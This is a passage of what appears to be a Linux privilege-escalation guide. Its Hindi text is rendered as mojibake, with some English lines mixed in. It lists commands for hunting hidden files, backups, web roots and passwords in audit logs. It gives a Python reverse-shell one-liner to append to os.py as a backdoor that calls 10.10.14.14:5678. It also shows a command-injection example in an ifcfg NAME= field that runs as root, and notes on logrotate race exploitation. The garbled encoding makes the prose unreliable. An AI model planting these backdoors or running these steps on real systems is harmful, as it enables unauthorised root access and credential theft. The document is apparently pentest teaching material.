1. рдЫрд┐рдкрд╛рд╡ рдХреЗ рд▓рд┐рдП рдбреЙрдЯ (.) рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реЗрдВ: рдЗрд╕ рддрд░рд╣ рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `ls` рдХрдорд╛рдВрдб рджреНрд╡рд╛рд░рд╛ рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `.bashrc` рдФрд░ `.ssh` рдЫрд┐рдкреЗ рд╣реБрдП рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

2. рдЫрд┐рдкрд╛рд╡ рдХреЗ рд▓рд┐рдП рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рдЕрдВрджрд░ рдЫрд┐рдкреЗ рд╣реБрдП рдлрд╝рд╛рдЗрд▓реЗрдВ: рдЗрд╕ рддрд░рд╣ рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `ls` рдХрдорд╛рдВрдб рджреНрд╡рд╛рд░рд╛ рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрддреА рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк рдЙрд╕ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ рд╕реАрдзреЗ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░реЗрдВ рддреЛ рдЖрдк рдЙрдиреНрд╣реЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `.ssh` рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдЫрд┐рдкреА рд╣реБрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

рдЫрд┐рдкреЗ рд╣реБрдП рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк `ls -a` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд╕реЗ рдЖрдкрдХреЛ рд╕рднреА рдЫрд┐рдкреЗ рд╣реБрдП рдлрд╝рд╛рдЗрд▓реЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдВрдЧреАред
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **рдкрд╛рде рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ/рдмрд╛рдЗрдирд░реА** 

If you find a script or binary in the system's PATH that is owned by a privileged user or has the setuid/setgid bit set, it may be a potential privilege escalation vector. 

рдпрджрд┐ рдЖрдк рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдкрд╛рде рдореЗрдВ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдпрд╛ рдмрд╛рдЗрдирд░реА рдвреВрдВрдврд╝рддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдореЗрдВ рд╣реИ рдпрд╛ setuid/setgid рдмрд┐рдЯ рд╕реЗрдЯ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди рд╡реЗрдХреНрдЯрд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

To exploit this, you can replace the script or binary with your own malicious code or execute it with elevated privileges. 

рдЗрд╕реЗ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдЕрдкрдиреЗ рдЦрд╝рддрд░рдирд╛рдХ рдХреЛрдб рдХреЗ рд╕рд╛рде рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдпрд╛ рдмрд╛рдЗрдирд░реА рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЙрдЪреНрдЪрддрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

To identify such scripts or binaries, you can use the `which` command to locate them in the PATH and then inspect their permissions and ownership using the `ls` command. 

рдЗрд╕ рддрд░рд╣ рдХреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдпрд╛ рдмрд╛рдЗрдирд░реА рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк `which` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рдкрд╛рде рдореЗрдВ рдвреВрдВрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ `ls` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдирдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдФрд░ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

If you find any suspicious scripts or binaries, analyze their functionality and determine if they can be leveraged for privilege escalation. 

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рднреА рд╕рдВрджрд┐рдЧреНрдз рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдпрд╛ рдмрд╛рдЗрдирд░реА рдХреЛ рдвреВрдВрдврд╝рддреЗ рд╣реИрдВ, рддреЛ рдЙрдирдХреЗ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░реЗрдВ рдФрд░ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╡реЗ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **рд╡реЗрдм рдлрд╝рд╛рдЗрд▓реЗрдВ**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **рдмреИрдХрдЕрдкреНрд╕**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### рдЬреНрдЮрд╛рдд рдкрд╛рд╕рд╡рд░реНрдб рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реЗрдВ

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) рдХреЛрдб рдХреЛ рдкрдврд╝реЗрдВ, рдпрд╣ **рдХрдИ рд╕рдВрднрд╛рд╡рд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ рдЦреЛрдЬрддрд╛ рд╣реИ рдЬреЛ рдкрд╛рд╕рд╡рд░реНрдб рд░рдЦ рд╕рдХрддреА рд╣реИрдВ**ред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдФрд░ **рджрд┐рд▓рдЪрд╕реНрдк рдЙрдкрдХрд░рдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) рдЬреЛ рдПрдХ рдУрдкрди рд╕реЛрд░реНрд╕ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рд╡рд┐рдВрдбреЛрдЬ, рд▓рд┐рдирдХреНрд╕ рдФрд░ рдореИрдХ рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрдИ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рд▓реЙрдЧ

рдпрджрд┐ рдЖрдк рд▓реЙрдЧ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдЙрдирдореЗрдВ **рджрд┐рд▓рдЪрд╕реНрдк/рдЧреЛрдкрдиреАрдп рдЬрд╛рдирдХрд╛рд░реА** рдорд┐рд▓ рд╕рдХрддреА рд╣реИред рдЬрд┐рддрдирд╛ рдЕрдЬреАрдм рд▓реЙрдЧ рд╣реЛрдЧрд╛, рдЙрддрдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрдЧрд╛ (рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ)ред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдХреБрдЫ "**рдмреБрд░реЗ**" рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП (рдмреИрдХрдбреЛрд░?) **рдСрдбрд┐рдЯ рд▓реЙрдЧ** рдЖрдкрдХреЛ рдСрдбрд┐рдЯ рд▓реЙрдЧ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд░рд┐рдХреЙрд░реНрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)ред
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
рдпрджрд┐ рдЖрдк **рдЧреНрд░реБрдк [adm](interesting-groups-linux-pe/#adm-group)** рдХреЗ рд▓реЙрдЧ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рдЖрдкрдХреА рдорджрдж рдХрд░реЗрдЧрд╛ред

### рд╢реИрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### рдЬреЗрдиреЗрд░рд┐рдХ рдХреНрд░реЗрдб рд╕рд░реНрдЪ/рд░реЗрдЬреЗрдХреНрд╕

рдЖрдкрдХреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ рднреА рдЪреЗрдХ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдЬрд┐рдирдореЗрдВ рд╢рдмреНрдж "**рдкрд╛рд╕рд╡рд░реНрдб**" рд╣реЛрддрд╛ рд╣реИ рдЙрд╕рдХреЗ **рдирд╛рдо** рдпрд╛ **рд╕рд╛рдордЧреНрд░реА** рдореЗрдВ, рдФрд░ рд▓реЙрдЧ рдореЗрдВ рдпрд╛ рд╣реИрд╢ рд░реЗрдЬреЗрдХреНрд╕ рдореЗрдВ рдЖрдИрдкреА рдФрд░ рдИрдореЗрд▓ рднреА рдЪреЗрдХ рдХрд░реЗрдВред\
рдореИрдВ рдпрд╣рд╛рдВ рд╕рднреА рдЪреЗрдХ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЛрдВ рдХреА рд╕реВрдЪреА рдирд╣реАрдВ рджреЗ рд░рд╣рд╛ рд╣реВрдБ рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдкрдХреЛ рдЗрдВрдЯрд░реЗрд╕реНрдЯ рд╣реИ рддреЛ рдЖрдк рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЪреЗрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) рдХрд░рддрд╛ рд╣реИред

## рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓реЗрдВ

### рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

рдпрджрд┐ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдХрд╣рд╛рдВ рд╕реЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЖрдк рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЖрдк рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдУрдПрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдЙрд╕реЗ рдмреИрдХрдбреЛрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрджрд┐ рдЖрдк рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рдЬрдЧрд╣ рдкрд░ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ os.py рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреА рдХреЙрдкреА рдФрд░ рдкреЗрд╕реНрдЯ рдХрд░реЗрдВ)ред

рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ **рдмреИрдХрдбреЛрд░** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, os.py рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдЕрдВрдд рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдВрдХреНрддрд┐ рдЬреЛрдбрд╝реЗрдВ (рдЖрдИрдкреА рдФрд░ рдкреЛрд░реНрдЯ рдмрджрд▓реЗрдВ):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### рд▓реЙрдЧрд░реЛрдЯреЗрд╢рди рд╢реЛрд╖рдг

`рд▓реЙрдЧрд░реЛрдЯреЗрд╢рди` рдкрд░ рдПрдХ рд╕рдВрдХрдЯ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдпрд╛ рдЗрд╕рдХреЗ **рдХрд┐рд╕реА рднреА рдорд╛рддрд╛-рдкрд┐рддрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛** рдореЗрдВ рд╣реЛрдиреЗ рдкрд░ `рд▓реЙрдЧрд░реЛрдЯреЗрд╢рди` рдХреЛ **рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рди рдкрд░ рдПрдХ рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрджрд┐ **рд▓реЙрдЧрд░реЛрдЯреЗрд╢рди** рдХреЛ **рд░реВрдЯ** рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ _**/etc/bash\_completion.d/**_ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдЧреА рдЬреЛ рдХрд┐ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛рдПрдЧреАред\
рддреЛ, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ **рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓** рдпрд╛ рдЗрд╕рдХреЗ **рдорд╛рддрд╛-рдкрд┐рддрд╛ рдлрд╝реЛрд▓реНрдбрд░** рдореЗрдВ **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реИ, рддреЛ рдЖрдк **рдЙрдЪреНрдЪрд╛рд░рдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЕрдзрд┐рдХрд╛рдВрд╢ рд▓рд┐рдирдХреНрд╕ рд╡рд┐рддрд░рдгреЛрдВ рдкрд░, рд▓реЙрдЧрд░реЛрдЯреЗрд╢рди рд░реЛрдЬрд╛рдирд╛ рдПрдХ рдмрд╛рд░ **рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ)ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рднреА рджреЗрдЦреЗрдВ рдХрд┐ _/var/log_ рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдФрд░ рднреА рдлрд╝рд╛рдЗрд▓реЗрдВ **рд░реЛрдЯреЗрдЯ** рд╣реЛ рд░рд╣реА рд╣реИрдВ рдпрд╛ рдирд╣реАрдВред

{% hint style="info" %}
рдпрд╣ рд╕рдВрдХрдЯ `рд▓реЙрдЧрд░реЛрдЯреЗрд╢рди` рд╕рдВрд╕реНрдХрд░рдг `3.18.0` рдФрд░ рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдкрд░ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ
{% endhint %}

рдЗрд╕ рд╕рдВрдХрдЯ рдХрд╛ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

рдЖрдк рдЗрд╕ рд╕рдВрдХрдЯ рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ [**logrotten**](https://github.com/whotwagner/logrotten) рдХреЗ рд╕рд╛рдеред

рдпрд╣ рд╕рдВрдХрдЯ [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx рд▓реЙрдЧ),** рдХреЗ рдмрд╣реБрдд рд╕рдорд╛рди рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЬрдм рднреА рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓реЗ рдХрд┐ рдЖрдк рд▓реЙрдЧ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рджреЗрдЦреЗрдВ рдХрд┐ рд╡реЗ рд▓реЙрдЧ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХреМрди рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рдХреНрдпрд╛ рдЖрдк рд▓реЙрдЧ рдХреЛ рд╕рд┐рдорд▓рд┐рдВрдХреНрд╕ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЙрдЪреНрдЪрд╛рд░рдг рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

рдпрджрд┐, рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ _/etc/sysconfig/network-scripts_ рдореЗрдВ рдПрдХ `ifcf-<whatever>` рд╕реНрдХреНрд░рд┐рдкреНрдЯ **рд▓рд┐рдЦрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ **рдпрд╛** рд╡рд╣ рдПрдХ рдореМрдЬреВрджрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ **рд╕рдорд╛рдпреЛрдЬрд┐рдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХрд╛ **рд╕рд┐рд╕реНрдЯрдо рдкреВрдирдГрдкреНрд░рд╛рдкреНрдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**ред

рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП _ifcg-eth0_, рдиреЗрдЯрд╡рд░реНрдХ рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддреЗ рд╣реИрдВред рд╡реЗ .INI рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рддрд░рд╣ рджрд┐рдЦрддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╡реЗ рд▓рд┐рдирдХреНрд╕ рдкрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░рдмрдВрдзрдХ (рдбрд┐рд╕реНрдкреИрдЪрд░.d) рджреНрд╡рд╛рд░рд╛ \~рд╕реНрд░реЛрддрд┐рдд\~ рд╣реЛрддреЗ рд╣реИрдВред

рдореЗрд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЗрди рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ `NAME=` рд╡рд┐рд╢реЗрд╖рддрд╛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╣реИрдВрдбрд▓ рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдирд╛рдо рдореЗрдВ **рд╕рдлреЗрдж/рдЦрд╛рд▓реА рдЬрдЧрд╣** рд╣реИ, рддреЛ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕рдлреЗрдж/рдЦрд╛рд▓реА рдЬрдЧрд╣ рдХреЗ рдмрд╛рдж рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдкрд╣рд▓реЗ рд╕рдлреЗрдж/рдЦрд╛рд▓реА рдЬрдЧрд╣ рдХреЗ рдмрд╛рдж рдХрд╛ рд╣рд░ рдЪреАрдЬрд╝ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИ**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
**рд╡рд┐рдХрд░реНрд╖рдг рд╕рдВрджрд░реНрдн:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init, init.d, systemd, рдФрд░ rc.d**

`/etc/init.d` рдореЗрдВ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рд╕рд┐рд╕реНрдЯрдо V рдЗрдирд┐рдЯ рдЯреВрд▓реНрд╕ (SysVinit) рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рд▓рд┐рдирдХреНрд╕ рдХреЗ рд▓рд┐рдП **рдкрд╛рд░рдВрдкрд░рд┐рдХ рд╕реЗрд╡рд╛ рдкреНрд░рдмрдВрдзрди рдкреИрдХреЗрдЬ** рд╣реИ, рдЬрд┐рд╕рдореЗрдВ `init` рдкреНрд░реЛрдЧреНрд░рд╛рдо (рдЬрдм рдХрд░реНрдирд▓ рдХреА рдкреНрд░рд╛рд░рдВрднрд┐рдХрдХрд░рдг рдкреВрд░рд╛ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ┬╣) рдФрд░ рдХреБрдЫ рдЕрд╡рдпрд╡ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд╢реБрд░реВ рдФрд░ рдмрдВрдж рдХрд░рдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддреЗ рд╣реИрдВред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, `/etc/init.d` рдореЗрдВ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реЛрддреА рд╣реИрдВ рдЬреЛ рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ рд╕реЗрд╡рд╛ рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `start`, `stop`, `restart`, рдФрд░ (рдЬрдм рд╕рдорд░реНрдерд┐рдд рд╣реЛ) `reload` рдХрдорд╛рдВрдб рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддреА рд╣реИрдВред рдЗрди рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ рд╕реАрдзреЗ рдпрд╛ (рд╕рдмрд╕реЗ рдЖрдорддреМрд░ рдкрд░) рдХрд┐рд╕реА рдЕрдиреНрдп рдЯреНрд░рд┐рдЧрд░ (рдЖрдорддреМрд░ рдкрд░ `/etc/rc?.d/` рдореЗрдВ рдПрдХ рдкреНрд░рддреАрдХрдЪрд┐рд╣реНрди рдХреА рдореМрдЬреВрджрдЧреА) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрд╣реНрд╡рд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред (рдпрд╣рд╛рдВ рд╕реЗ [рдпрд╣рд╛рдВ](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)ред) рдЗрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдХрд╛ рдПрдХ рдЕрдиреНрдп рд╡рд┐рдХрд▓реНрдк Redhat рдореЗрдВ `/etc/rc.d/init.d` 